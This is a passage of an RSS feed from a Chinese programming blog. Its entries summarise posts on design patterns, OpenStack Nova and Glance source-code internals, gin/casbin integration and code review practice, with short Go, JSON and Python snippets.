&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;正确代码：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;package&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;

&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fmt&amp;#34;&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;() {  
    &lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Println&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;works!&amp;#34;&lt;/span&gt;)
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    
    <item>
      <title>集成gin和casbin</title>
      <link>/posts/%E9%9B%86%E6%88%90gin%E5%92%8Ccasbin/</link>
      <pubDate>Mon, 28 Sep 2020 21:32:59 +0000</pubDate>
      
      <guid>/posts/%E9%9B%86%E6%88%90gin%E5%92%8Ccasbin/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;https://dev.to/maxwellhertz/tutorial-integrate-gin-with-cabsin-56m0&#34;&gt;原文&lt;/a&gt;，省略了一些无关的内容。&lt;/p&gt;
&lt;p&gt;如果你搜到这篇文章，那么什么是gin以及casbin应该不用过多解释了。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>OpenStack源码学习笔记6</title>
      <link>/posts/openstack%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B06/</link>
      <pubDate>Mon, 20 Jul 2020 17:46:29 +0000</pubDate>
      
      <guid>/posts/openstack%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B06/</guid>
      <description>&lt;p&gt;很久之前发现一个现象，在生产环境中配置了保留内存&lt;code&gt;reserved_host_memory_mb&lt;/code&gt;以及 &lt;strong&gt;没配置&lt;/strong&gt; 内存超分比&lt;code&gt;ram_allocation_ratio&lt;/code&gt;的情况下，虚拟机使用的内存居然已经快将物理内存耗尽了。&lt;/p&gt;
&lt;p&gt;比如物理机内存300G，方便举例忽略掉一些系统占用，当设置了&lt;code&gt;reserved_host_memory_mb&lt;/code&gt;为20G，那么理论上所有虚拟机最大占用内存量为280G，而查看居然已经使用了290G的内存，还是在虚拟机并没有将各自申请的内存全部使用掉的情况下(比如申请一台4G的虚拟机，但物理机操作系统层面并没有分配4G给对应的进程，除非虚拟机内部把内存占满)。&lt;/p&gt;
&lt;p&gt;单单就nova而言，如果在集群启动时就指定了保留内存大小和超分比为1的话，是不应该出现上述情形的。除非后期对这2个参数进行过修改，但由于年代久远已经没法追溯，这也就成了一桩悬案。&lt;/p&gt;
&lt;p&gt;不过在追踪这个问题的过程中，顺便也学习了下主机热迁移的过程，这里的代码是 &lt;em&gt;&lt;strong&gt;N版&lt;/strong&gt;&lt;/em&gt; 。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>设计模式-享元模式</title>
      <link>/posts/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E4%BA%AB%E5%85%83%E6%A8%A1%E5%BC%8F/</link>
      <pubDate>Wed, 20 May 2020 16:58:08 +0000</pubDate>
      
      <guid>/posts/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E4%BA%AB%E5%85%83%E6%A8%A1%E5%BC%8F/</guid>
      <description>&lt;p&gt;用共享的方式提供大量细粒度的对象，降低系统创建类实例的性能消耗，不是特别常用的一种模式。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>OpenStack源码学习笔记5</title>
      <link>/posts/openstack%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B05/</link>
      <pubDate>Mon, 30 Mar 2020 17:46:29 +0000</pubDate>
      
      <guid>/posts/openstack%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B05/</guid>
      <description>&lt;p&gt;今天遇到一个诡异的问题，对某个有问题的计算节点进行疏散，结果有些虚拟机的根磁盘居然消！失！了？首先能够确定的是ceph不会自动删除，那么一定是某个地方触发了删除根磁盘的操作。&lt;/p&gt;
&lt;p&gt;这如果发生在生产环境可是一个极其严重的问题，正好借此排查的机会梳理一下nova关于主机疏散的流程。&lt;/p&gt;
&lt;p&gt;以下代码为N版，但大体流程相差应该不大。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>设计模式-外观模式</title>
      <link>/posts/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E5%A4%96%E8%A7%82%E6%A8%A1%E5%BC%8F/</link>
      <pubDate>Wed, 08 Jan 2020 16:58:08 +0000</pubDate>
      
      <guid>/posts/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E5%A4%96%E8%A7%82%E6%A8%A1%E5%BC%8F/</guid>
      <description>&lt;p&gt;这个模式即便没听说过，也很可能在很多地方已经使用了，是非常常用的设计模式之一，完美体现了面向对象“封装”的特性。简单说就是通过一个“外观”将系统内部的实现隐藏起来，将外部系统和内部系统进行解耦。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>设计模式-装饰器模式</title>
      <link>/posts/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E8%A3%85%E9%A5%B0%E5%99%A8%E6%A8%A1%E5%BC%8F/</link>
      <pubDate>Thu, 02 Jan 2020 16:58:08 +0000</pubDate>
      
      <guid>/posts/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E8%A3%85%E9%A5%B0%E5%99%A8%E6%A8%A1%E5%BC%8F/</guid>
      <description>&lt;p&gt;在python中有一个非常常用的语法糖&lt;code&gt;@&lt;/code&gt;，本质上就是装饰器。这种模式可以不改变原文件的情况下动态的扩展一个对象的功能而不用创建子类，避免了类膨胀，是一种比较常用的模式，有个细节需要注意的就是装饰的顺序。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>设计模式-组合模式</title>
      <link>/posts/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E7%BB%84%E5%90%88%E6%A8%A1%E5%BC%8F/</link>
      <pubDate>Mon, 23 Dec 2019 17:58:08 +0000</pubDate>
      
      <guid>/posts/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E7%BB%84%E5%90%88%E6%A8%A1%E5%BC%8F/</guid>
      <description>&lt;p&gt;组合模式(Composite Pattern):将对象组合成树形结构表示来“部分-整体”的层次结构，使用户对单个对象和组合对象的使用具有一致性。&lt;/p&gt;
&lt;p&gt;看上去有点抽象，其实就是一种树形结构。比如二叉树，每个非叶子节点都有2个子节点，叶子节点除了没有子节点外和父节点、根节点都是一样的。在通俗来说，比如公司的层级架构，从老板(根节点)到经理(非叶子节点)再到员工(叶子节点)，他们有很多共性的东西，比如都有姓名、工号，老板和经理有添加、移除手下员工的能力，而作为员工则只能干活。&lt;/p&gt;
&lt;p&gt;从代码实现来说，就是老板、经理、员工使用一个抽象类，而老板和经理实现某些特定的方法，这就是组合模式，十分容易理解。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>设计模式-桥接模式</title>
      <link>/posts/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F/</link>
      <pubDate>Thu, 12 Dec 2019 16:58:08 +0000</pubDate>
      
      <guid>/posts/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F/</guid>
      <description>&lt;p&gt;桥接模式核心原理是将抽象部分和实现部分分析，使二者可以独立的变化。再具体一点，当某个类型由于自身逻辑可以有两个或多个维度的变化，使用桥接模式可以令这些维度变化时不影响其他维度。再举个例子，手机——可以按照品牌来分类，比如苹果华为三星，也可以按照功能分类，比如拍照手机，游戏手机等等。&lt;/p&gt;
&lt;p&gt;桥接模式有2个设计原则：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;使用聚合而不使用继承。（使用继承一定是在&lt;code&gt;is-a&lt;/code&gt;的关系时再考虑使用）&lt;/li&gt;
&lt;li&gt;抽象和实现分离。&lt;/li&gt;
&lt;/ol&gt;</description>
    </item>
    
    <item>
      <title>OpenStack源码学习笔记4</title>
      <link>/posts/openstack%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B04/</link>
      <pubDate>Mon, 09 Dec 2019 12:46:29 +0000</pubDate>
      
      <guid>/posts/openstack%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B04/</guid>
      <description>&lt;p&gt;这篇文章记录nova创建快照时候的过程，根据&lt;a href=&#34;https://docs.openstack.org/api-ref/compute/?expanded=create-image-createimage-action-detail#create-image-createimage-action&#34;&gt;文档&lt;/a&gt;，创建快照其实是向&lt;code&gt;/servers/{server_id}/action&lt;/code&gt;发送了一个POST的请求，内容则是类似:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;{
    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;createImage&amp;#34;&lt;/span&gt; : {
        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt; : &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;image-name&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;metadata&amp;#34;&lt;/span&gt;: {}
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    
    <item>
      <title>如何更好的Code Review</title>
      <link>/posts/%E5%A6%82%E4%BD%95%E6%9B%B4%E5%A5%BD%E7%9A%84code-review/</link>
      <pubDate>Tue, 03 Dec 2019 11:05:03 +0000</pubDate>
      
      <guid>/posts/%E5%A6%82%E4%BD%95%E6%9B%B4%E5%A5%BD%E7%9A%84code-review/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;https://levelup.gitconnected.com/how-to-do-good-code-reviews-ee481f73b11b&#34;&gt;原文&lt;/a&gt;，向原作者表示感谢。不过不知道作者是不是在国内学过作文，让我想起了小学时老师教的作文要多引用名人名言哈哈。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;几年前当我还是个菜鸟的时候，我过得十分潇洒。&lt;/p&gt;
&lt;p&gt;写代码——交给别人review——改代码，绳命是多磨美好！工作内容就是仔细阅读我收到的评论、建议，学着成为一个更优秀的开发者。如今我成长为了一名高级开发人员，给别人做code review成为了我的职责之一，这时我意识到我的经验还不足以完成这种职责转变。&lt;/p&gt;
&lt;p&gt;每次给别人做code review时我都感觉到害怕，感觉自己像是一个骗子，很多问题都困扰着我：&lt;/p&gt;
&lt;p&gt;&lt;em&gt;我该给这行代码提建议吗？&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;应该有更好的办法写这段代码，我应该告诉他吗？&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;他会怎么想？他的经验比我丰富。&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;改了这一行代码会不会使程序崩溃？&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;这时我的导师给了我建议。&lt;/p&gt;
&lt;p&gt;好的code review聚焦于获得额外的产出，而非仅仅是找到bug。别把review当做是审讯，而当做是一种提高代码质量、发现其他方案、增加学习能力以及加强友谊的办法。&lt;/p&gt;
&lt;p&gt;作为reviewer，你对代码的反馈是将渴望贡献的开发者组建成社区的一种主要方法。通过培养一个活跃的社区，你将提升产品、团队、和人生的质量。&lt;/p&gt;
&lt;p&gt;这里有一些做好code review的建议。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>设计模式-适配器模式</title>
      <link>/posts/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E9%80%82%E9%85%8D%E5%99%A8%E6%A8%A1%E5%BC%8F/</link>
      <pubDate>Thu, 28 Nov 2019 16:58:08 +0000</pubDate>
      
      <guid>/posts/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E9%80%82%E9%85%8D%E5%99%A8%E6%A8%A1%E5%BC%8F/</guid>
      <description>&lt;p&gt;适配器模式目的就是不改变原有系统的基础上保留其提供的服务，向调用者提供新的接口服务，使得原本由于接口不兼容而不能一起工作的类可以一起工作。（简单说就是增加兼容性，复用已经存在的功能）&lt;/p&gt;
&lt;p&gt;笔记本电脑的电源变压器就是这个原理，把交流电转换成直流电。或者把英文翻译成中文，都是适配器模式。&lt;/p&gt;
&lt;p&gt;又分为2种：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;对象适配器模式&lt;/li&gt;
&lt;li&gt;类适配器模式&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;适配器虽好，但也不要乱用，如果能在设计阶段就统一就是最好的，适配器模式更像是一种补丁。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>OpenStack源码学习笔记3</title>
      <link>/posts/openstack%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B03/</link>
      <pubDate>Mon, 04 Nov 2019 12:46:29 +0000</pubDate>
      
      <guid>/posts/openstack%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B03/</guid>
      <description>&lt;p&gt;最近看了下关于OpenStack如何统计更新CPU、内存、硬盘等硬件资源的部分，由于历史原因下面的代码来自&lt;code&gt;newton&lt;/code&gt;版。&lt;/p&gt;
&lt;p&gt;简单说，OpenStack先通过定时任务进行资源统计，入口代码位于&lt;code&gt;nova\compute\manager.py&lt;/code&gt;中&lt;code&gt;ComputeManager&lt;/code&gt;类的&lt;code&gt;update_available_resource&lt;/code&gt;函数。默认情况下每分钟更新一次：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;@periodic_task.periodic_task&lt;/span&gt;(spacing&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;CONF&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;update_resources_interval)
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;update_available_resource&lt;/span&gt;(self, context):
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;See driver.get_available_resource()
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    Periodic process that keeps that the compute host&amp;#39;s understanding of
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    resource availability and usage in sync with the underlying hypervisor.
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    :param context: security context
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    &amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;

    compute_nodes_in_db &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;_get_compute_nodes_in_db(context,
                                                        use_slave&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;True)
    nodenames &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; set(self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;driver&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get_available_nodes())
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; nodename &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; nodenames:
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;update_available_resource_for_node(context, nodename)

    self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;_resource_tracker_dict &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {
        k: v &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; k, v &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;_resource_tracker_dict&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;items()
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; k &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; nodenames}

    &lt;span style=&#34;color:#75715e&#34;&gt;# Delete orphan compute node not reported by driver but still in db&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; cn &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; compute_nodes_in_db:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; cn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hypervisor_hostname &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; nodenames:
            LOG&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(_LI(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Deleting orphan compute node &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;), cn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;id)
            cn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;destroy()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;首先获取所有节点，然后维护了一个名为&lt;code&gt;_resource_tracker_dict&lt;/code&gt;的字典用来记录host和&lt;code&gt;ResourceTracker&lt;/code&gt;实例的对应关系，所有的资源更新行为都在&lt;code&gt;ResourceTracker&lt;/code&gt;中进行处理。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>设计模式-单例模式</title>
      <link>/posts/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/</link>
      <pubDate>Mon, 28 Oct 2019 16:58:08 +0000</pubDate>
      
      <guid>/posts/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/</guid>
      <description>&lt;p&gt;单例模式可以说是最容易理解的一种设计模式了，当需要某个类仅有一个全局唯一对象时可以使用，比如某些配置项。核心思想就是新建某个类实例时先进行一次判断，如果不存在则创建新实例返回，否则返回已经存在的实例。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>设计模式-原型模式</title>
      <link>/posts/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8F/</link>
      <pubDate>Mon, 14 Oct 2019 17:58:08 +0000</pubDate>
      
      <guid>/posts/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8F/</guid>
      <description>&lt;p&gt;原型模式(Prototype Pattern)：使用原型实例创建指定创建对象的种类，并通过拷贝这些原型创建新对象。这个模式很好理解，就是&lt;code&gt;ctrl+c，ctrl+v&lt;/code&gt;后做一些小修改。&lt;/p&gt;
&lt;p&gt;这里面涉及一个知识点就是深拷贝和浅拷贝的问题，但我相信任何python开发人员都知道&lt;code&gt;copy()&lt;/code&gt;和&lt;code&gt;deepcopy()&lt;/code&gt;的区别，这里就不多说了（有兴趣的可以去看python中这2个函数的实现）。&lt;/p&gt;
&lt;p&gt;个人理解当需要多个类对象时，如果要进行很多复杂的、消耗时间的初始化操作，而这些对象之间又仅有少量不同时，可以考虑使用原型模式。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>设计模式-建造者模式</title>
      <link>/posts/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E5%BB%BA%E9%80%A0%E8%80%85%E6%A8%A1%E5%BC%8F/</link>
      <pubDate>Sat, 12 Oct 2019 16:58:08 +0000</pubDate>
      
      <guid>/posts/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E5%BB%BA%E9%80%A0%E8%80%85%E6%A8%A1%E5%BC%8F/</guid>
      <description>&lt;p&gt;建造者模式(Builder Pattern)：将复杂对象的创建和表示分离，使同样的构建过程可以创建不同的表示。&lt;/p&gt;
&lt;p&gt;进一步说，建造者隐藏了产品是如何组装的，使建造代码和表示代码分离。建造对象时 &lt;strong&gt;构件顺序稳定&lt;/strong&gt; 的情况下，不管每一步具体怎么变都可以适用。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/images/design-pattern/builder.png&#34; alt=&#34;builder.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>设计模式-工厂模式</title>
      <link>/posts/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/</link>
      <pubDate>Wed, 09 Oct 2019 16:58:08 +0000</pubDate>
      
      <guid>/posts/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/</guid>
      <description>&lt;p&gt;工厂模式又可以分为工厂方法模式和抽象工厂模式。&lt;/p&gt;
&lt;h2 id=&#34;工厂方法模式factory-method-pattern&#34;&gt;工厂方法模式(Factory Method Pattern)&lt;/h2&gt;
&lt;p&gt;工厂模式是指：定义一个接口用户创建对象，让子类决定实例化哪一个类。&lt;/p&gt;
&lt;p&gt;工厂模式中存在4个角色：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;抽象工厂&lt;/li&gt;
&lt;li&gt;具体工厂&lt;/li&gt;
&lt;li&gt;抽象产品&lt;/li&gt;
&lt;li&gt;具体产品&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;抽象工厂产生抽象产品，具体工厂生产具体产品。&lt;/strong&gt; 这句话很重要，理解了这句话就理解了工厂方法模式。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>设计模式-总览</title>
      <link>/posts/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E6%80%BB%E8%A7%88/</link>
      <pubDate>Tue, 08 Oct 2019 16:58:08 +0000</pubDate>
      
      <guid>/posts/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E6%80%BB%E8%A7%88/</guid>
      <description>&lt;p&gt;很久很久以前，忘记从哪看到一句话——设计模式是对编程语言缺陷的弥补。&lt;/p&gt;
&lt;p&gt;年轻的我并没意识到这句话背后的真实含义以及所处语境，外加之后主要开发语言是Python这个动态语言，设计模式真的没怎么用到——比如装饰模式不就是Python中的装饰器嘛，一个语法糖能解决的事居然还弄出个模式来？&lt;/p&gt;
&lt;p&gt;直到我开始学习openstack的源码，发现里面用到了大量的设计模式，才明白自己是多么无知可笑。&lt;/p&gt;
&lt;p&gt;这里借用一位大佬的话：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;如果你觉得设计模式在某程度上没用，说明两个问题：&lt;br&gt;
1.你的系统还不足以复杂到要用设计模式的程度&lt;br&gt;
2.你的经验还没强到能熟练应用设计模式的程度。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;能找到这篇文章的，应该都知道面向过程、面向对象、封装继承多态、高内聚低耦合（包含程序级别以及架构级别）、开闭原则(对扩展开放、对修改关闭)、依赖倒置原则(尽量使用抽象类型作为对象实例变量类型，用于实现开闭原则)、单一责任原则(一个模块只负责一个功能)等一堆的名词，以及“组合优于继承”(这里略有争议，我个人对此赞同，最近看一些继承过多的代码总是要向上找好几层父类，还要仔细看子类中有没有重写父类方法，术语叫做类膨胀)。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>OpenStack源码学习笔记2</title>
      <link>/posts/openstack%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02/</link>
      <pubDate>Wed, 18 Sep 2019 12:46:29 +0000</pubDate>
      
      <guid>/posts/openstack%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02/</guid>
      <description>&lt;p&gt;上次学习了Nova创建虚拟机的过程，这次来看一下Glance是如何上传镜像的。相比于Nova，Glance源码使用了大量的代理模式和装饰器模式，阅读代码时候一个不仔细就会一脸懵X。根据上次说的Openstack套路，我们通过&lt;code&gt;setup.cfg&lt;/code&gt;直奔主题——&lt;code&gt;glance/cmd/api.py&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;():
    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
        config&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;parse_args()
        config&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;set_config_defaults()
        wsgi&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;set_eventlet_hub()
        logging&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;setup(CONF, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;glance&amp;#39;&lt;/span&gt;)
        notifier&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;set_defaults()
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; cfg&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;CONF&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;profiler&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;enabled:
            _notifier &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; osprofiler&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;notifier&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;create(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Messaging&amp;#34;&lt;/span&gt;,
                                                   oslo_messaging, {},
                                                   notifier&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get_transport(),
                                                   &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;glance&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;api&amp;#34;&lt;/span&gt;,
                                                   cfg&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;CONF&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;bind_host)
            osprofiler&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;notifier&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;set(_notifier)
            osprofiler&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;web&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;enable(cfg&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;CONF&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;profiler&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hmac_keys)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
            osprofiler&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;web&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;disable()
        server &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; wsgi&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Server(initialize_glance_store&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;True)
        server&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;start(config&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;load_paste_app(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;glance-api&amp;#39;&lt;/span&gt;), default_port&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;9292&lt;/span&gt;)
        server&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;wait()
